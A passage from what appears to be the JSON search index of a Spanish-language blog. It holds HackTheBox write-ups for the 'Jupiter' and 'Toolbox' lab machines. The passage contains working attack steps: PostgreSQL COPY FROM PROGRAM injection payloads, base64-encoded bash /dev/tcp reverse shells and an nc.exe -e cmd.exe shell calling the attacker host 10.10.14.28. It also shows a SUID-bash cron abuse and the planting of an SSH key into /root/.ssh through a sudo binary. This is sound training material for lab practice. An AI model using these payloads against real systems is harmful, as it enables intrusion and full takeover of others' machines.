/dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1, pero lo pondremos dentro de bash -c \u0026quot;bash- i...\u0026quot; porque puede ser que la normal la bloquee la mÃ¡quina vÃ­ctima. En resumen quedarÃ¡ asÃ­:\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34; Antes de aplicarlo a la inyecciÃ³n vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | base64 El comando final que tendremos que poner en la inyecciÃ³n seria, primero un echo con el base64, despuÃ©s un base64 -d para decodear el base64 y por Ãºltimo bash para que el resultado del base64 lo ejecute con bash.\necho YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash Esto aplicado a la inyecciÃ³n quedarÃ­a de la siguiente forma:\n\u0026#34;rawSql\u0026#34;:\u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash\u0026#39;;\u0026#34; Â¡Recibimos la conexiÃ³n!\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.28] from (UNKNOWN) [10.10.11.216] 46594 bash: cannot set terminal process group (18744): Inappropriate ioctl for device bash: no job control in this shell postgres@jupiter:/var/lib/postgresql/14/main$ Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Escalada de privilegios Con un ifconfig podemos comprobar que estamos en la mÃ¡quina vÃ­ctima y no en ningÃºn contenedor\npostgres@jupiter:/var/lib/postgresql/14/main$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.10.11.216 netmask 255.255.254.0 broadcast 10.10.11.255 ... Sabiendo que la web era un grafana, existe un archivo interesante, el cual puede contener credenciales e informaciÃ³n de valor que estÃ¡ en /etc/grafana/grafana.ini, pero no tenemos permisos para verlo\npostgres@jupiter:/etc/grafana$ cat grafana.ini cat: grafana.ini: Permission denied juno Vamos a investigar si hay alguna tarea cron ejecutÃ¡ndose cada \u0026lsquo;x\u0026rsquo; tiempo, para ello vamos a usar pspy. Para usarlo simple nos lo descargamos en nuestra mÃ¡quina, nos montamos un servidor con python en el directorio en el que estÃ© guardado\npython3 -m http.server Y nos lo descargamos en la mÃ¡quina vÃ­ctima en el directorio /tmp\nwget 10.10.14.28/pspy64 Por Ãºltimo le damos permisos de ejecuciÃ³n y lo ejecutamos\nchmod +x pspy64 ./pspy64 DespuÃ©s de un rato capturando procesos vemos un script ubicado en /home/juno/shadow-simulation.sh el cual se esta ejecutando con bash. TambiÃ©n se estÃ¡ ejecutando /home/juno/.local/bin/shadow pasandole el archivo /dev/shm/network-simulation.yml\n2023/11/01 18:52:01 CMD: UID=1000 PID=21187 | /bin/bash /home/juno/shadow-simulation.sh 2023/11/01 18:52:01 CMD: UID=1000 PID=21186 | /bin/sh -c /home/juno/shadow-simulation.sh 2023/11/01 18:52:01 CMD: UID=1000 PID=21189 | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 2023/11/01 18:52:01 CMD: UID=1000 PID=21198 | /usr/bin/python3 -m http.server 80 2023/11/01 18:52:01 CMD: UID=1000 PID=21199 | /usr/bin/curl -s server No tenemos acceso a /home/juno por lo que no podemos ver el script shadow-simulation.sh, pero sÃ­ tenemos acceso a /dev/shm. Si hacemos un cat al /dev/shm/network-simulation.yml podemos ver lo siguiente:\ngeneral: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s Si nos fijamos, hay dos comandos que se estÃ¡n ejecutando python3 -m http.server 80 y curl -s server los cuales en el pspy salÃ­a que se ejecutaban despuÃ©s del /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml\n2023/11/01 18:52:01 CMD: UID=1000 PID=21198 | /usr/bin/python3 -m http.server 80 2023/11/01 18:52:01 CMD: UID=1000 PID=21199 | /usr/bin/curl -s server Con un ls -l vemos que tenemos permisos de escritura y lectura en el /dev/shm/network-simulation.yml\n$ls -l /dev/shm/network-simulation.yml -rw-rw-rw- 1 juno juno 815 Mar 7 2023 /dev/shm/network-simulation.yml AsÃ­ que vamos a modificarlo\u0026hellip;\nVamos a hacer que haga una copia de /bin/bash en /tmp/bash y le dÃ© permisos suid\nhosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/bash start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/chmod args: u+s /tmp/bash start_time: 5s Ahora solo falta esperar a que se ejecute y ejecutar /tmp/bash -p para ejecutar la bash con privilegios\npostgres@jupiter:/tmp$ /tmp/bash -p bash-5.1$ whoami juno jovian Pasa una cosa rara y es que somos juno, pero algunos comandos se ejecutan como postgres como en este caso Ã¬d\nbash-5.1$ whoami juno bash-5.1$ id uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert) Para solucionar esto vamos a conectarnos por ssh, primero en la mÃ¡quina atacante vamos a crear las llaves ssh con ssh-keygen. Esto nos crearÃ¡ una carpeta en nuestro directorio llamada .ssh, dentro habrÃ¡ un archivo llamado id_rsa.pub que serÃ¡ nuestra llave pÃºblica, esta llave vamos a tener que ponerla en /home/juno/authorized_keys. Ahora ya nos podemos conectar por ssh sin necesidad de especificar contraseÃ±as\nssh juno@10.10.11.216 Ahora que ya tenemos una consola en condiciones, vamos a hacer un id para ver en que grupos estamos\nuid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science) Hay un grupo que llama la atenciÃ³n, science. Podemos buscar que archivos pertenecen a este grupo con el siguiente comando\nfind / -group science 2\u0026gt;/dev/null /opt/solar-flares /opt/solar-flares/flares.csv /opt/solar-flares/xflares.csv /opt/solar-flares/map.jpg /opt/solar-flares/start.sh /opt/solar-flares/logs /opt/solar-flares/logs/jupyter-2023-03-10-25.log /opt/solar-flares/logs/jupyter-2023-03-08-37.log /opt/solar-flares/logs/jupyter-2023-03-08-38.log /opt/solar-flares/logs/jupyter-2023-03-08-36.log /opt/solar-flares/logs/jupyter-2023-03-09-11.log /opt/solar-flares/logs/jupyter-2023-03-09-24.log /opt/solar-flares/logs/jupyter-2023-03-08-14.log /opt/solar-flares/logs/jupyter-2023-03-09-59.log /opt/solar-flares/flares.html /opt/solar-flares/cflares.csv /opt/solar-flares/flares.ipynb /opt/solar-flares/.ipynb_checkpoints /opt/solar-flares/mflares.csv El find reporta que en el /opt hay muchos archivos del grupo science.\nSi vamos al /opt/solar-flares/logs, hay muchos archivos de logs, al hacer un cat al mÃ¡s reciente se ve lo siguiente\njuno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-11-01-22.log ..... [I 19:22:56.926 NotebookApp] http://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 [I 19:22:56.927 NotebookApp] or http://127.0.0.1:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 ..... Vemos que hay una web en la mÃ¡quina vÃ­ctima por el puerto 8888, pero ese puerto no lo reporto nmap, eso es porque seguramente este puerto solo se puede ver desde la mÃ¡quina vÃ­ctima. Para ver mÃ¡s informaciÃ³n de los puertos podemos usar ss -tnlp\njuno@jupiter:/opt/solar-flares/logs$ ss -tnlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 511 0.0.0.0:80 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 128 127.0.0.1:8888 0.0.0.0:* LISTEN 0 244 127.0.0.1:5432 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* Si queremos ver este puerto desde nuestra mÃ¡quina podemos hacer port forwarding, podrÃ­amos usar ssh, pero no me apetece asÃ­ que vamos a usar chisel.\nUsarlo es muy sencillo, simplemente nos lo descargamos en nuestra mÃ¡quina, lo pasamos a la mÃ¡quina vÃ­ctima con un servidor con python como hicimos con pspy anteriormente (python3 -m http.server 80), le damos permisos de ejecuciÃ³n (chmod +x chisel) y ejecutamos lo siguiente\nMÃ¡quina atacante:\nsudo ./chisel server --reverse -p 1234 MÃ¡quina vÃ­ctima:\n./chisel client 10.10.14.28:443 R:8888:127.0.0.1:8888 \u0026amp; Ahora nuestro puerto 8888 equivale al puerto 8888 de la mÃ¡quina vÃ­ctima, con esto completado ya podemos entrar al link que veÃ­amos en los logs\nhttp://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 Una vez dentro vemos varios archivos los cuales podemos modificar, por lo que podemos intuir que esta web estÃ¡ siendo ejecutada por root o por jovian. Si vamos a flares.ipynb vemos un archivo que parece tener una documentaciÃ³n de python y arriba hay un botÃ³n que pone run y tenemos capacidad para modificar el archivo asÃ­ que se puede intentar un rce.\nimport os os.system(\u0026#39;whoami\u0026#39;) jovian Pues tenemos un rce y ya sabemos quiÃ©n estaba ejecutando esto: jovian\nPara conseguir una reverse shell vamos a usar lo mismo que usamos al principio, asÃ­ que no lo voy a voler a explicar para no alargar el post\nimport os os.system(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash\u0026#39;) Ya somos jovian!\n$ nc -nlvp 443 listening on [any] 443 ... jovian@jupiter:/opt/solar-flares$ root Con un sudo -l vemos que podemos ejecutar como root sin la necesidad de proporcionar contraseÃ±a el archivo /usr/local/bin/sattrack\n$ sudo -l User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack Al ejecutarlo nos sale que no ha encontrado el archivo de configuraciÃ³n\njovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack sudo /usr/local/bin/sattrack Satellite Tracking System Configuration file has not been found. Please try again! Vamos a probar de ver desde donde lo estÃ¡ cargando con el comando strings. El comando strings es bÃ¡sicamente como un cat, pero que solo muestra el contenido legible de archivos como binarios, fotografias, etc..\nstrings /usr/local/bin/sattrack | grep config /tmp/config.json Vemos la ruta /tmp/config.json, pero claro, no existe, lo que podemos hacer es buscar en el sistema si existe algÃºn config.json que sea la configuraciÃ³n default para este binario\n$ find / -name config.json 2\u0026gt; /dev/null /usr/local/share/sattrack/config.json El comando find nos reporta un config.json que estÃ¡ en una carpeta que se llama igual que el binario asÃ­ que supongo que tendrÃ¡n algo que ver, vamos a copiar ese archivo al /tmp\ncp /usr/local/share/sattrack/config.json /tmp/config.json Ahora ya podemos ejecutar el binario, pero se queda colgado cargando el recurso de una web.\n$ sudo /usr/local/bin/sattrack Satellite Tracking System tleroot does not exist, creating it: /tmp/tle/ Get:0 http://celestrak.org/NORAD/elements/weather.txt Vamos a ver si podemos modificar esto desde el archivo config.json\n{ \u0026#34;tleroot\u0026#34;: \u0026#34;/tmp/tle/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;weather.txt\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;/usr/local/share/sattrack/map.json\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;/usr/local/share/sattrack/earth.png\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://celestrak.org/NORAD/elements/weather.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/noaa.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink\u0026amp;FORMAT=tle\u0026#34; ], \u0026#34;updatePerdiod\u0026#34;: 1000, \u0026#34;station\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;LORCA\u0026#34;, \u0026#34;lat\u0026#34;: 37.6725, \u0026#34;lon\u0026#34;: -1.5863, \u0026#34;hgt\u0026#34;: 335.0 }, \u0026#34;show\u0026#34;: [ ], \u0026#34;columns\u0026#34;: [ \u0026#34;name\u0026#34;, \u0026#34;azel\u0026#34;, \u0026#34;dis\u0026#34;, \u0026#34;geo\u0026#34;, \u0026#34;tab\u0026#34;, \u0026#34;pos\u0026#34;, \u0026#34;vel\u0026#34; ] } En tlsources estÃ¡n las webs que estaba cargando el binario, como nosotros tenemos permisos para modificar este script podemos probar de poner nuestra ip y abrirnos un servidor con python (python3 -m http.server 80) para ver si recibimos la peticiÃ³n\njovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack Satellite Tracking System Get:0 http://10.10.14.28 python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.216 - - [01/Nov/2023 21:25:27] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Efectivamente recibimos la peticiÃ³n. Ahora podrÃ­amos probar de poner en vez de nuestra ip poner file:///root/root.txt\nDespuÃ©s de ejecutarlo tenemos la flag de root en /tmp/tle/root.txt\nYa tenemos la flag, pero la gracia es tener una consola como root asÃ­ que lo que vamos a hacer es generarnos unas llaves de ssh en nuestra mÃ¡quina\nssh-keygen Ahora dentro de nuestro directorio personal tenemos una carpeta .ssh y dentro estÃ¡n las llaves, vamos a copiar la llave pÃºblica Ã¬d_rsa.pub y la vamos a poner en un archivo llamado authorized_keys, en ese mismo directorio nos vamos a montar otro servidor con python python3 -m http.server 80\nEn la mÃ¡quina vÃ­ctima vamos a modificar un poco el archivo /tmp/config.json, en la opciÃ³n tle root podemos poner en que ruta queremos que se descarguen los archivos, ahÃ­ vamos a poner la ruta de las llaves de root\n\u0026#34;tleroot\u0026#34;: \u0026#34;/root/.ssh/\u0026#34;, Por Ãºltimo en tlesources pondremos nuestra ip y el archivo authorized_keys\n\u0026#34;http://10.10.14.28/authorized_keys\u0026#34; Ahora al ejecutar el programa se pondrÃ¡ nuestra llave pÃºblica dentro de las authorized_keys de root lo que nos va a permitir conectarnos por ssh sin la necesidad de proporcionar contraseÃ±a\nssh root@10.10.11.216 root@jupiter:~# ","date":"2023-11-01","id":49,"permalink":"/writeups/hackthebox/jupiter/","summary":"En la mÃ¡quina de hoy vamos a estar tocando enumeraciÃ³n de subdominios, derivaremos una inyecciÃ³n postgresql a un RCE. Y para la escalada tocaremos tareas cron, portfordwarding y python","tags":["CTF","RCE","SQLI","Cron","Port forwarding","Python"],"title":"Jupiter"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.10.236 PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data. 64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=152 ms --- 10.10.10.236 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 151.535/151.535/151.535/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Windows\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.236 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nextractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.236 5 â”‚ [*] Open ports: 21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; nmap -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV 10.10.10.236 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) | 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) |_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.38 (Debian) |_ssl-date: TLS randomness does not represent time |_http-title: MegaLogistics | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR | Not valid before: 2020-02-18T17:45:56 |_Not valid after: 2021-02-17T17:45:56 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-10-29T20:34:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: 1s ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos FTP Nmap a reportada que en el puerto 21 (FTP) estÃ¡ el login Anonymous habilitado. Esto significa que podemos entrar con el usuario anonymous sin necesidad de proporcionar contraseÃ±a. Una vez conectados vemos un archivo llamado docker-toolbox.exe que de momento no podemos hacer nada con Ã©l, pero no lo olvidaremos ğŸ˜‰\n$ ftp 10.10.10.236 Connected to 10.10.10.236. Name (10.10.10.236:d3b0o): anonymous 331 Password required for anonymous Password: 230 Logged on ftp\u0026gt; ls -r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe SMB El nmap tambiÃ©n reporto que habÃ­a un smb corriendo en la mÃ¡quina vÃ­ctima. Con un crackmapexec vemos un poco mÃ¡s de informaciÃ³n sobre la mÃ¡quina vÃ­ctima\u0026hellip;\ncrackmapexec smb 10.10.10.236 SMB 10.10.10.236 445 TOOLBOX [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False) Ahora podrÃ­amos probar de listar los recursos compartidos en el smb para ello vamos a usar distintas herramientas, pero no tenemos permisos para enumerar los recursos asÃ­ que no podemos tirar por aquÃ­ tampoco\nSmbclient\rCrackmapexec\rSmbmap\r$ smbclient -L 10.10.10.236 -N session setup failed: NT_STATUS_ACCESS_DENIED $ crackmapexec smb 10.10.10.236 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.236 445 TOOLBOX [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False) SMB 10.10.10.236 445 TOOLBOX [-] Toolbox\\: STATUS_ACCESS_DENIED SMB 10.10.10.236 445 TOOLBOX [-] Error enumerating shares: Error occurs while reading from remote(104) $ smbmap -H 10.10.10.236 ________ ___ ___ _______ ___ ___ __ _______ /\u0026#34; )|\u0026#34; \\ /\u0026#34; || _ \u0026#34;\\ |\u0026#34; \\ /\u0026#34; | /\u0026#34;\u0026#34;\\ | __ \u0026#34;\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /\u0026#39; /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __\u0026#39; \\ (| / /\u0026#34; \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) ----------------------------------------------------------------------------- SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com https://github.com/ShawnDEvans/smbmap [*] Detected 1 hosts serving SMB [*] Established 0 SMB session(s) HTTPS Volviendo al escaneo de nmap, hay una lÃ­nea en el resultado del puerto 443 que dice lo siguiente\nssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR AsÃ­ que vamos a aÃ±adir este dominio en el /etc/hosts\n10.10.10.236 megalogistic.com admin.megalogistic.com En la web admin.megalogistic.com vemos un panel de login. Al probar la tipica inyecciÃ³n sql ' or 1=1-- - en el campo del usuario vemos que podemos iniciar sesiÃ³n satisfactoriamente. En la web no podemos sacar mucha informaciÃ³n, simplemente podemos ver el desarrollador y la versiÃ³n (MegaCorp 1.0.0) y un to-do que dice lo siguiente:\nEnviar credenciales a Tony Actualizar los drivers de la impresora IntrusiÃ³n En el panel anterior se pueden probar mÃ¡s cositas, de momento solo hemos probado de iniciar sesiÃ³n con el 'or 1=1-- -, pero a lo mejor podemos hacer mÃ¡s cositas.\nEmpezamos poniendo una comilla para ver si sale algÃºn error legible de la base de datos.\nWarning: pg_query(): Query failed: ERROR: unterminated quoted string at or near \u0026#34;\u0026#39;\u0026#39;\u0026#39; AND password = md5(\u0026#39;\u0026#39;);\u0026#34; LINE 1: SELECT * FROM users WHERE username = \u0026#39;\u0026#39;\u0026#39; AND password = md5(... ^ in /var/www/admin/index.php on line 10 Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11 Efectivamente, sale un error en el cual sale pg_query() con esto sabemos que estamos ante un PostgreSQL\nPara saber como hacer una inyecciÃ³n a un PostgreSQL existe un recurso muy interesante de la repo de Payloads All The Things, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyecciÃ³n sql a un rce (Remote Code Execution)\nBÃ¡sicamente, consiste en crear una tabla en la base de datos en uso por la web\nCREATE TABLE cmd_exec(cmd_output text); Mediante COPY se pondrÃ¡ en la tabla el resultado del comando id, lo que provocarÃ¡ que se ejecute el comando Ã¬d\nCOPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;; De forma opcional, en el caso de que podamos ver el output lo podrÃ­amos ver simplemente haciendo una peticiÃ³n a la tabla cmd_exec\nSELECT * FROM cmd_exec; Sabiendo esto vamos con la explotaciÃ³n:\nPrimero se intercepta la peticiÃ³n con burpsuite y la mandamos al repeter para trabajar mejor. En el apartado username vamos a aÃ±adir una comilla para cerrar la del username y despues vamos a poner un ; para hacer otra peticiÃ³n. Ahora ya podemos poner la peticiÃ³n que realizara la inyecciÃ³n CREATE TABLE cmd_exec(cmd_output text);. Por Ãºltimo al final se comenta con un -- - para que ignore la siguiente parte de la querry de verificaciÃ³n de la password (Si esto no te queda claro tengo un video en mi canal de youtube en el cual explico en 6 minutos como funcionan las inyecciones sql)\nusername=\u0026#39;;+CREATE+TABLE+cmd_exec(cmd_output text)-- - Ahora ya tenemos la tabla cmd_exec creada\nReverse Shell Sabiendo que la mÃ¡quina es windows si queremos mandarnos una reverse shell tenemos que compartir con un samba el ejecutable de netcat (nc.exe). Si estÃ¡s desde un kali o parrot seguramente ya lo tendrÃ¡s instalado lo puedes encontrar con un locate nc.exe. Ahora, ya desde el mismo directorio que tenemos el nc.exe podemos abrir el servidor samba de la siguiente forma:\nimpacket-smbserver smb $(pwd) --smb2support ExplicaciÃ³n parÃ¡metros\r${pwd}: Esto equivale a poner la ruta actual de trabajo, en este comando nos sirve para decir donde queremos que abra el servidor samba \u0026ndash;smb2support: Sirve para habilitar el soporte de la versiÃ³n 2 de samba Ahora nos ponemos en escucha por el puerto 443 para recibir la reverse shell\nnc -nlvp 443 ExplicaciÃ³n parÃ¡metros\rn: Sirve para que no haga la resoluciÃ³n de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por Ãºltimo la p sirve para especificar el nÃºmero de puerto en el cual vamos a estar en escucha Teniendo el servidor samba abierto y estando en escucha ya podemos mandar la reverse shell mediante la inyecciÃ³n sql.\nusername=\u0026#39;;+COPY+cmd_exec+FROM+PROGRAM+\u0026#39;//10.10.14.28/nc.exe+-e+cmd.exe+10.10.14.28+443\u0026#39;-- -\u0026amp;password=test No recibimos nada\u0026hellip;\nA lo mejor, por mucho que la mÃ¡quina sea windows tiene un docker asÃ­ que podemos probar de en vez de mandar la reverseshell con un netcat en un samba, mandarla directamente con bash\nLa tÃ­pica reverse shell de bash es: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1, pero lo pondremos dentro de bash -c \u0026quot;bash- i...\u0026quot; porque puede ser que la normal la bloquee la mÃ¡quina vÃ­ctima. En resumen quedarÃ¡ asÃ­:\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34; Antes de aplicarlo a la inyecciÃ³n vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | base64 Ahora ya tenemos el base64 generado, pero hay un + en la cadena, el cual podemos sustituir por un %2b. El comando final que tendremos que poner en la inyecciÃ³n seria, primero un echo con el base64, despuÃ©s un base64 -d para decodear el base64 y por Ãºltimo bash para que el resultado del base64 lo ejecute con bash.\necho 